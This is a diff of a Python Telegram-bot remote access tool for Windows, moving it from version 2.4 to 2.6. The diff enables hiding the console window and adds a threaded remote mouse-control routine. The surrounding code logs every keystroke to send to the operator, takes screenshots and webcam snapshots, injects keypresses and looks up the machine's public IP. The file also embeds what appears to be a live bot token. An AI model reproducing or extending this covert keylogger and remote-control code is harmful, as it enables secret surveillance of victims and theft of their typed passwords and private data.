@@ -1,6 +1,9 @@
 chat_user_id = 1813084538
 ######################
-#2.4
+#2.6
+#echo - echo command
+# r - повтор предыдущей команды
+#работа с мышью в отдельном потоке
 #mouse!!!!! m.hel
 ######################
 bot_token = '2141768237:AAEJAmf-w5wXxQZsSkrJ1YxrqbtSUwhGURE'
@@ -18,7 +21,7 @@ import win32gui
 from time import sleep
 #import ctypes
 #user32 = ctypes.windll.user32
-versi = '2.4'
+versi = '2.6'
 
 
 
@@ -69,12 +72,12 @@ timescreen = 0
 
 
 
-#win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
+win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
 
 
 
 log = ''
-help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \n m.hel - help mouse command\ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
+help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \necho- бот повторит ваше сообщение\n m.hel - help mouse command\nr - repeat last command\ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
 mkfl = False
 #close the programm 
 #NEEDS TESTING
@@ -98,21 +101,33 @@ mtme = 0.3
 xmx = 1920
 ymx = 1080
 mscp = 10
+textq = ''
+oldtext = ''
 def message_handler(update: Update, context: CallbackContext):
 	text = update.message.text
-
+	global oldtext
+	if not text:
+		return	
+	
+	if text == 'r':
+		text = oldtext
+	
+	oldtext = text
+	global textq
+	textq = text
  
 
-
+	
 	global mkfl
 	global timescreen
+	
 	global mset
 	global mtme
 	global xmx
 	global ymx
 	global mscp
-	if not text:
-		return
+	
+
 	mas = text.split('\n')		#keys: alt, ctrl, space, enter, delete
 	if text[:4] == 'del.' or text[:4] == 'pri.' or text[:4] == 'prs.':
 		for elem in mas:
@@ -126,65 +141,7 @@ def message_handler(update: Update, context: CallbackContext):
 			elif com == 'prs.':		#prs.alt+tab
 				keyboard.send(par)
 	
-	if text[:2] == 'm.':
-	# set - кол во циклов defolt 10
-	# rnd - запуск рандомайзера
-	# tme - задержка между передвижениями defolt 0.3
-	# hel - help для команды mouse
-	# xmx - максимальное значение х defolt 1920
-	# yxm - максимальное значение для y defolt 1080
-	# mcl - left click 
-	# mcr - right click
-	# hid теребоньканье курсора +- 10 пикселей
-	# fri - freeze mouse
-		helptext = 'm.\n	 rnd - запуск рандомайзера\nfri - freeze mouse\n hid теребоньканье курсора +- 10 пикселей \n mcl - left click \n mcr - right click \n m.par - параметры\nНАСТРОЙКА:\n set - кол во циклов defolt 10\n srp - установить кол во пикселей для тряски\n tme - задержка между передвижениями defolt 0.3\n hel - help для команды mousexmx - максимальное значение х defolt 1920 \n yxm - максимальное значение для y defolt 1080  \n '
-		text = text[2:]
-		mcom = text[:3]
-		text = text[3:]
-		if mcom == 'set':
-			mset = int(text)
-		if mcom == 'tme':
-			mtme = float(text)
-		if mcom == 'xmx':
-			xmx = int(text)
-		if mcom == 'ymx':
-			ymx = int(text)
-		if mcom == 'hel':
-				bot.send_message(chat_id=chat_user_id, text=helptext)
-		if mcom == 'srp':
-				mscp = int(text)
-		if mcom == 'rnd':
-			for i in range(mset):
-				x = random.randint(1, xmx)
-				y = random.randint(1, ymx)
-				win32api.SetCursorPos((x,y))
-				time.sleep(mtme)
-		if mcom == 'mcl':
-			(x,y)=win32gui.GetCursorPos()
-			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
-			win32api.mouse_event(win32con.MOUSEEVENTF_UP,x,y,0,0)
-		if mcom == 'mcr':
-			(x,y)=win32gui.GetCursorPos()
-			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN,x,y,0,0)
-			time.sleep(0.05)
-			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP,x,y,0,0)
-		if mcom == 'hid':
-			for i in range(mset):
-				(x,y)=win32gui.GetCursorPos()
-				x = random.randint(x-mscp, x+mscp)
-				y = random.randint(y-mscp, y+mscp)				
-				win32api.SetCursorPos((x,y))
-				time.sleep(mtme)			
-		if mcom == 'par':
-			mseting='xmx = '+str(xmx)+'\nymx = '+str(ymx)+'\nset = '+str(mset)+'\ntme = '+str(mtme)+'\n srp = '+str(mscp)
-			bot.send_message(chat_id=chat_user_id, text=mseting)
-		if mcom == "fri":
-			(x,y)=win32gui.GetCursorPos()
-			for i in range(int(mset)):
-				win32api.SetCursorPos((x,y))
-				time.sleep(0.0001)
-			
-		
+
 		
 	#text = ' '
 
@@ -231,6 +188,8 @@ def message_handler(update: Update, context: CallbackContext):
 				mkfl = False
 			else:
 				mkfl = True
+	elif text[:4] == 'echo':
+		echo(text[4:])
 	elif text[0] == '!':
 		text=text[1:]
 		text = int(text)
@@ -255,6 +214,79 @@ def message_handler(update: Update, context: CallbackContext):
 		bot.send_message(chat_id=chat_user_id, text=str(status) )
 
 
+
+def echo(text):
+	bot.send_message(chat_id=chat_user_id, text=str(text) )
+	
+
+def mousecontrol():
+	global mset
+	global mtme
+	global xmx
+	global ymx
+	global mscp
+	while True:
+		global textq
+		if textq[:2] == 'm.':
+	# set - кол во циклов defolt 10
+	# rnd - запуск рандомайзера
+	# tme - задержка между передвижениями defolt 0.3
+	# hel - help для команды mouse
+	# xmx - максимальное значение х defolt 1920
+	# yxm - максимальное значение для y defolt 1080
+	# mcl - left click 
+	# mcr - right click
+	# hid теребоньканье курсора +- 10 пикселей
+	# fri - freeze mouse
+			helptext = 'm.\n	 rnd - запуск рандомайзера\nfri - freeze mouse\n hid теребоньканье курсора +- 10 пикселей \n mcl - left click \n mcr - right click \n m.par - параметры\nНАСТРОЙКА:\n set - кол во циклов defolt 10\n srp - установить кол во пикселей для тряски\n tme - задержка между передвижениями defolt 0.3\n hel - help для команды mousexmx - максимальное значение х defolt 1920 \n yxm - максимальное значение для y defolt 1080  \n '
+			textq = textq[2:]
+			mcom = textq[:3]
+			textq = textq[3:]
+			if mcom == 'set':
+				mset = int(textq)
+			if mcom == 'tme':
+				mtme = float(textq)
+			if mcom == 'xmx':
+				xmx = int(textq)
+			if mcom == 'ymx':
+				ymx = int(textq)
+			if mcom == 'hel':
+					bot.send_message(chat_id=chat_user_id, text=helptext)
+			if mcom == 'srp':
+					mscp = int(textq)
+			if mcom == 'rnd':
+				for i in range(mset):
+					x = random.randint(1, xmx)
+					y = random.randint(1, ymx)
+					win32api.SetCursorPos((x,y))
+					time.sleep(mtme)
+			if mcom == 'mcl':
+				(x,y)=win32gui.GetCursorPos()
+				win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
+				#win32api.mouse_event(win32con.MOUSEEVENTF_UP,x,y,0,0)
+			if mcom == 'mcr':
+				(x,y)=win32gui.GetCursorPos()
+				win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN,x,y,0,0)
+				time.sleep(0.05)
+				win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP,x,y,0,0)
+			if mcom == 'hid':
+				for i in range(mset):
+					(x,y)=win32gui.GetCursorPos()
+					x = random.randint(x-mscp, x+mscp)
+					y = random.randint(y-mscp, y+mscp)				
+					win32api.SetCursorPos((x,y))
+					time.sleep(mtme)			
+			if mcom == 'par':
+				mseting='xmx = '+str(xmx)+'\nymx = '+str(ymx)+'\nset = '+str(mset)+'\ntme = '+str(mtme)+'\n srp = '+str(mscp)
+				bot.send_message(chat_id=chat_user_id, text=mseting)
+			if mcom == "fri":
+				(x,y)=win32gui.GetCursorPos()
+				for i in range(int(mset)):
+					win32api.SetCursorPos((x,y))
+					time.sleep(0.0001)
+			
+			
+	
 
 
 
@@ -399,10 +431,10 @@ def callback(event):
 		log += str(datetime.now()) + ' ' + str(tmp) + '\n'
 	else:
 		log += str(datetime.now()) + ' ' + str(event.name) + '\n'
-
+'''
 def mouseandkeyboard():
 	global mkfl
-'''
+
 	while True:
 		global mkfl
 		##print(mkfl)
@@ -431,11 +463,15 @@ updater.start_polling()
 #start keyboard listening
 b = Thread(target = start_key)
 b.start()
+'''
 mouseandkeyboard = Thread(target =mouseandkeyboard )
 mouseandkeyboard.start()
-
+'''
 autoscreen = Thread(target =autoscreen )
 autoscreen.start()
+
+mousecontrol = Thread(target =mousecontrol )
+mousecontrol.start()
 
 
 conn = http.client.HTTPConnection("ifconfig.me")
